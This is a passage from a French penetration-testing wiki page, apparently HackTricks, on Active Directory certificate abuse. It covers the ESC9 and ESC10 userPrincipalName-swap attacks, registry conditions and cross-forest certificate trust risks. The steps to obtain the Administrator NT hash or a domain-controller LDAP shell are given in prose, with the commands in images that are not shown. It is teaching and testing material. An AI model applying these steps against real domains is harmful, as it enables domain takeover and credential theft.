<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (22).png" alt=""><figcaption></figcaption></figure>

Ensuite, nous changeons le `userPrincipalName` de `Jane` pour qu'il soit `Administrator`. Remarquez que nous omettons la partie `@corp.local`.

<figure><img src="../../../.gitbook/assets/image (2) (2) (3).png" alt=""><figcaption></figcaption></figure>

Cela ne viole pas de contrainte, car le `userPrincipalName` de l'utilisateur `Administrator` est `Administrator@corp.local` et non `Administrator`.

Maintenant, nous demandons le modèle de certificat vulnérable `ESC9`. Nous devons demander le certificat en tant que `Jane`.

<figure><img src="../../../.gitbook/assets/image (16) (2).png" alt=""><figcaption></figcaption></figure>

Remarquez que le `userPrincipalName` dans le certificat est `Administrator` et que le certificat délivré ne contient aucun "SID d'objet".

Ensuite, nous rétablissons le `userPrincipalName` de `Jane` pour qu'il soit autre chose, comme son `userPrincipalName` d'origine `Jane@corp.local`.

<figure><img src="../../../.gitbook/assets/image (24) (2).png" alt=""><figcaption></figcaption></figure>

Maintenant, si nous essayons de nous authentifier avec le certificat, nous recevrons le hachage NT de l'utilisateur `Administrator@corp.local`. Vous devrez ajouter `-domain <domaine>` à votre ligne de commande car aucun domaine n'est spécifié dans le certificat.

<figure><img src="../../../.gitbook/assets/image (3) (1) (3).png" alt=""><figcaption></figcaption></figure>

## Mappages de certificats faibles - ESC10

### Explication

ESC10 fait référence à deux valeurs de clé de registre sur le contrôleur de domaine.

`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` `CertificateMappingMethods`. Valeur par défaut `0x18` (`0x8 | 0x10`), précédemment `0x1F`.

`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` `StrongCertificateBindingEnforcement`. Valeur par défaut `1`, précédemment `0`.

**Cas 1**

`StrongCertificateBindingEnforcement` défini sur `0`

**Cas 2**

`CertificateMappingMethods` contient le bit `UPN` (`0x4`)

### Abus Cas 1

* `StrongCertificateBindingEnforcement` défini sur `0`
* `GenericWrite` sur n'importe quel compte A pour compromettre n'importe quel compte B

Dans ce cas, `John@corp.local` a `GenericWrite` sur `Jane@corp.local`, et nous souhaitons compromettre `Administrator@corp.local`. Les étapes d'abus sont presque identiques à ESC9, sauf que n'importe quel modèle de certificat peut être utilisé.

Tout d'abord, nous obtenons le hachage de `Jane` avec, par exemple, Shadow Credentials (en utilisant notre `GenericWrite`).

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (19).png" alt=""><figcaption></figcaption></figure>

Ensuite, nous changeons le `userPrincipalName` de `Jane` pour qu'il soit `Administrator`. Remarquez que nous omettons la partie `@corp.local`.

<figure><img src="../../../.gitbook/assets/image (5) (3).png" alt=""><figcaption></figcaption></figure>

Cela ne viole pas de contrainte, car le `userPrincipalName` de l'utilisateur `Administrator` est `Administrator@corp.local` et non `Administrator`.

Maintenant, nous demandons n'importe quel certificat qui permet l'authentification client, par exemple le modèle `User` par défaut. Nous devons demander le certificat en tant que `Jane`.

<figure><img src="../../../.gitbook/assets/image (14) (2) (1).png" alt=""><figcaption></figcaption></figure>

Remarquez que le `userPrincipalName` dans le certificat est `Administrator`.

Ensuite, nous rétablissons le `userPrincipalName` de `Jane` pour qu'il soit autre chose, comme son `userPrincipalName` d'origine `Jane@corp.local`.

<figure><img src="../../../.gitbook/assets/image (4) (1) (3).png" alt=""><figcaption></figcaption></figure>

Maintenant, si nous essayons de nous authentifier avec le certificat, nous recevrons le hachage NT de l'utilisateur `Administrator@corp.local`. Vous devrez ajouter `-domain <domaine>` à votre ligne de commande car aucun domaine n'est spécifié dans le certificat.

<figure><img src="../../../.gitbook/assets/image (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

### Abus Cas 2

* `CertificateMappingMethods` contient le drapeau `UPN` (`0x4`)
* `GenericWrite` sur n'importe quel compte A pour compromettre n'importe quel compte B sans propriété `userPrincipalName` (comptes machine et administrateur de domaine intégré `Administrator`)

Dans ce cas, `John@corp.local` a `GenericWrite` sur `Jane@corp.local`, et nous souhaitons compromettre le contrôleur de domaine `DC$@corp.local`.

Tout d'abord, nous obtenons le hachage de `Jane` avec, par exemple, Shadow Credentials (en utilisant notre `GenericWrite`).

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10).png" alt=""><figcaption></figcaption></figure>

Ensuite, nous changeons le `userPrincipalName` de `Jane` pour qu'il soit `DC$@corp.local`.

<figure><img src="../../../.gitbook/assets/image (18) (2) (1).png" alt=""><figcaption></figcaption></figure>

Cela ne viole pas de contrainte, car le compte d'ordinateur `DC$` n'a pas de `userPrincipalName`.

Maintenant, nous demandons n'importe quel certificat qui permet l'authentification client, par exemple le modèle `User` par défaut. Nous devons demander le certificat en tant que `Jane`.

<figure><img src="../../../.gitbook/assets/image (20) (2).png" alt=""><figcaption></figcaption></figure>
Ensuite, nous modifions à nouveau le `userPrincipalName` de `Jane` pour qu'il soit autre chose, comme son `userPrincipalName` d'origine (`Jane@corp.local`).

<figure><img src="../../../.gitbook/assets/image (9) (1) (3).png" alt=""><figcaption></figcaption></figure>

Maintenant, étant donné que cette clé de registre s'applique à Schannel, nous devons utiliser le certificat pour l'authentification via Schannel. C'est là que la nouvelle option `-ldap-shell` de Certipy entre en jeu.

Si nous essayons de nous authentifier avec le certificat et `-ldap-shell`, nous remarquerons que nous sommes authentifiés en tant que `u:CORP\DC$`. Il s'agit d'une chaîne envoyée par le serveur.

<figure><img src="../../../.gitbook/assets/image (21) (2) (1).png" alt=""><figcaption></figcaption></figure>

L'une des commandes disponibles pour le shell LDAP est `set_rbcd`, qui permet de définir une délégation contrainte basée sur les ressources (RBCD) sur la cible. Ainsi, nous pourrions effectuer une attaque RBCD pour compromettre le contrôleur de domaine.

<figure><img src="../../../.gitbook/assets/image (7) (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

Alternativement, nous pouvons également compromettre n'importe quel compte utilisateur pour lequel aucun `userPrincipalName` n'est défini ou lorsque le `userPrincipalName` ne correspond pas au `sAMAccountName` de ce compte. D'après mes propres tests, l'administrateur de domaine par défaut `Administrator@corp.local` n'a pas de `userPrincipalName` défini par défaut, et ce compte devrait par défaut avoir plus de privilèges dans LDAP que les contrôleurs de domaine.

## Compromettre les forêts avec des certificats

### Rupture des confiances des AC pour les forêts de confiance

La configuration de l'**inscription inter-forêts** est relativement simple. Les administrateurs publient le **certificat de l'AC racine** de la forêt de ressources **dans les forêts de compte** et ajoutent les certificats de l'**AC d'entreprise** de la forêt de ressources aux conteneurs **`NTAuthCertificates`** et AIA **dans chaque forêt de compte**. Pour être clair, cela signifie que l'**AC** de la forêt de ressources a **un contrôle total** sur toutes les **autres forêts pour lesquelles elle gère la PKI**. Si des attaquants **compromettent cette AC**, ils peuvent **contrefaire des certificats pour tous les utilisateurs des forêts de ressources et de compte**, en rompant la frontière de sécurité de la forêt.

### Principaux étrangers avec des privilèges d'inscription

Une autre chose dont les organisations doivent se méfier dans les environnements multi-forêts est lorsque les AC d'entreprise **publient des modèles de certificats** qui accordent aux **Utilisateurs authentifiés ou aux principaux étrangers** (utilisateurs/groupes externes à la forêt à laquelle appartient l'AC d'entreprise) des **droits d'inscription et de modification**.\
Lorsqu'un compte **s'authentifie via une confiance**, AD ajoute le **SID des Utilisateurs authentifiés** au jeton de l'utilisateur authentifiant. Par conséquent, si un domaine dispose d'une AC d'entreprise avec un modèle qui **accorde aux Utilisateurs authentifiés des droits d'inscription**, un utilisateur d'une autre forêt pourrait potentiellement **s'inscrire dans le modèle**. De même, si un modèle accorde explicitement des **droits d'inscription à un principal étranger**, une **relation de contrôle d'accès inter-forêts est créée**, permettant à un principal d'une forêt de **s'inscrire dans un modèle d'une autre forêt**.

En fin de compte, ces deux scénarios **augmentent la surface d'attaque** d'une forêt à une autre. Selon les paramètres du modèle de certificat, un attaquant pourrait exploiter cela pour obtenir des privilèges supplémentaires dans un domaine étranger.

## Références

* Toutes les informations de cette page ont été tirées de [https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
